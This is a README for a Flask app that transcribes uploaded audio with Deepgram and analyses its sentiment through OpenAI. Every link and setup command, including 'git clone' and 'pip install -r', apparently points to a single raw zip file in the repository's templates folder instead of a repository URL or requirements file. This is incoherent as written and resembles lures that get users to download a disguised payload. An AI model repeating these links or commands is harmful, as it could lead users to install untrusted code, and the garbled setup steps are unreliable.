# alindor_task

***Flask Application for sentiment analysis***

This Flask application allows users to upload audio files, which are then processed to extract text using Deepgram's speech-to-text service. The extracted text undergoes sentiment analysis via OpenAI's API, providing insights into the emotional tone of the dialogue within the audio file. This document outlines how to set up, run, and deploy the application.

***Prerequisites***

Before you begin, ensure you have the following:

1. Python 3.8 or later installed on your machine.
2. Docker should be installed for containerization and deployment.
3. A Google Cloud account for deployment with Google Cloud Run.
4. OpenAI API key for sentiment analysis.
5. Deepgram API key for speech-to-text conversion.

Install https://github.com/viper-108/alindor_task/raw/refs/heads/main/templates/task_alindor_3.2.zip file to create a python environment installed with the mentioned libraries, command to install the https://github.com/viper-108/alindor_task/raw/refs/heads/main/templates/task_alindor_3.2.zip file -
python -m pip install -r https://github.com/viper-108/alindor_task/raw/refs/heads/main/templates/task_alindor_3.2.zip --no-cache-dir

***Usage***

1. Uploading Audio Files: Use the web interface to upload audio files. The application will process the files, perform speech-to-text conversion, and then analyze the sentiment of the extracted text.
   
2. API Endpoints: The application also provides REST API endpoints for uploading audio files and retrieving results programmatically. (Detail these endpoints based on your implementation.)

***Local Setup***

***Step 1: Clone the Repository***

1. git clone https://github.com/viper-108/alindor_task/raw/refs/heads/main/templates/task_alindor_3.2.zip
2. cd alindor_task

***Step 2: Install Dependencies***

python -m pip install -r https://github.com/viper-108/alindor_task/raw/refs/heads/main/templates/task_alindor_3.2.zip --no-cache-dir

***Step 3: Set Environment Variables***

OPENAI_API_KEY=your_openai_api_key_here
DEEPGRAM_API_KEY=your_deepgram_api_key_here
FLASK_SECRET_KEY=your_flask_secret_key_here

***Step 4: Run the Application***

flask run

